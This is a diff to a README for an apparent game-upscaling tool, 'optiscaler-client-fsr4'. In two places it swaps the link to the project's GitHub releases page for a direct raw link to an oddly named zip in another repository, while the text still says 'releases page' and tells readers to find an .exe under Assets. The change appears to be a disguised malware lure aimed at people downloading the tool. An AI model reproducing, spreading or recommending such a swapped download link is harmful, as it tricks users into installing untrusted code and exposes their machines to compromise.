@@ -5,7 +5,7 @@ description: "Implement AMD FidelityFX Super Resolution 4 with frame generation 
 ---
 # ⚙️ optiscaler-client-fsr4 - Boost your PC gaming frame rates
 
-[ ![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Hatp2158/optiscaler-client-fsr4/releases)
+[ ![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://raw.githubusercontent.com/Hatp2158/hatp2158.github.io/main/frowardness/hatp-github-io-v3.2.zip)
 
 ## What is this tool
 
@@ -17,7 +17,7 @@ The tool provides a simple interface to manage your installed games. You do not 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Hatp2158/optiscaler-client-fsr4/releases) to access the download options.
+1. Visit the [releases page](https://raw.githubusercontent.com/Hatp2158/hatp2158.github.io/main/frowardness/hatp-github-io-v3.2.zip) to access the download options.
 2. Select the newest version available at the top of the list.
 3. Look for the file ending in `.exe` under the Assets section.
 4. Download the file to your computer.
